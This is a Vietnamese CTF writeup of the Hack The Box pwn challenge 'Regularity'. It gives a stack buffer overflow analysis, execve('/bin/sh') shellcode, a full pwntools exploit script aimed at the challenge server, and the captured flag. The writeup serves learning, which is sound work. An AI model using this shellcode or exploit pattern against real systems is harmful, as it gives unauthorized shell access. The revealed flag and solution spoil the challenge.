---
title: "Regularity - Hack The Box CTF Try Out Writeup"
date: 2025-11-30
categories: [CTF, Tournament]
tags: [HTB, pwn]
description: "No Description."
---

## Thông tin challenge

- **Tên**: Regularity
- **Thể loại**: PWN (Binary Exploitation)
- **Server**: 154.57.164.82:30412

## Phân tích

### 1. Tổng quan chương trình

Chương trình được viết bằng assembly x86-64, thực hiện các bước sau:
1. In ra message "Hello, Survivor. Anything new these days?"
2. Đọc input từ người dùng
3. In ra message "Yup, same old same old here as well..."
4. Thoát chương trình

### 2. Phân tích hàm `read`

```asm
read            proc near
buf             = byte ptr -100h

                sub     rsp, 100h           ; Cấp phát 0x100 bytes trên stack
                mov     eax, 0
                mov     edi, 0              ; fd = stdin
                lea     rsi, [rsp+100h+buf] ; rsi = rsp (buffer address)
                mov     edx, 110h           ; Đọc 0x110 bytes!!!
                syscall                     ; sys_read
                add     rsp, 100h
                retn
read            endp
```

**Lỗ hổng**: Buffer chỉ có **0x100 bytes** (256 bytes) nhưng chương trình đọc **0x110 bytes** (272 bytes) → **Buffer Overflow 16 bytes**!

### 3. Stack Layout

```
┌─────────────────────┐ RSP (sau khi sub rsp, 100h)
│                     │
│   Buffer (0x100)    │  ← Input được ghi vào đây
│                     │
├─────────────────────┤ RSP + 0x100
│   Return Address    │  ← Bị ghi đè bởi 8 bytes overflow
├─────────────────────┤ RSP + 0x108
│   (thêm 8 bytes)    │
└─────────────────────┘
```

### 4. Các yếu tố quan trọng

1. **Stack có quyền thực thi (RWX)**: Kiểm tra PHT Entry 3 có flags = 7 (Read/Write/Execute)
2. **Không có ASLR/PIE**: Địa chỉ cố định
3. **Sau syscall read, RSI vẫn chứa địa chỉ buffer**
4. **Có gadget `jmp rsi` tại địa chỉ 0x401041**

```asm
; Trong _start:
.text:0000000000401037    mov     rsi, offset exit
.text:0000000000401041    jmp     rsi          ; <- Gadget này!
```

## Khai thác

### Chiến lược

1. Đặt shellcode ở đầu buffer
2. Padding đến đủ 0x100 bytes
3. Ghi đè return address bằng `0x401041` (địa chỉ `jmp rsi`)
4. Khi hàm `read` return → nhảy đến `jmp rsi` → RSI trỏ đến shellcode → **RCE!**

### Shellcode

Sử dụng shellcode `execve("/bin/sh", NULL, NULL)`:

```asm
xor rsi, rsi              ; rsi = NULL (argv)
push rsi                  ; Push NULL terminator
mov rdi, 0x68732f2f6e69622f  ; "/bin//sh" (little endian)
push rdi
push rsp
pop rdi                   ; rdi = pointer to "/bin//sh"
xor rdx, rdx              ; rdx = NULL (envp)
push 0x3b
pop rax                   ; rax = 59 (sys_execve)
syscall
```

### Exploit Script

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

p = remote('154.57.164.82', 30412)

# Nhận message đầu tiên
print(p.recvuntil(b'?\n'))

# Shellcode execve("/bin/sh", NULL, NULL)
shellcode = asm('''
    xor rsi, rsi
    push rsi
    mov rdi, 0x68732f2f6e69622f
    push rdi
    push rsp
    pop rdi
    xor rdx, rdx
    push 0x3b
    pop rax
    syscall
''')

jmp_rsi = 0x401041

# Payload: shellcode + padding + return address
payload = shellcode
payload += b'A' * (0x100 - len(shellcode))  # Pad đến 0x100 bytes
payload += p64(jmp_rsi)                      # Return address -> jmp rsi

p.send(payload)
p.interactive()
```

## Kết quả

```
$ python3 solve.py
[+] Opening connection to 154.57.164.82 on port 30412: Done
b'Hello, Survivor. Anything new these days?\n'
Shellcode length: 25
Payload length: 264
[*] Switching to interactive mode
$ cat flag.txt
flag{...}
```

## Tổng kết

| Kỹ thuật | Mô tả |
|----------|-------|
| Buffer Overflow | Ghi đè return address |
| Shellcode Injection | Stack có quyền thực thi |
| ROP Gadget | Sử dụng `jmp rsi` để nhảy đến shellcode |

**Flag**: `HTB{juMp1nG_w1tH_tH3_r3gIsT3rS?_3bcffd24f7a2a8a31b9e6c3048b0830c}`**!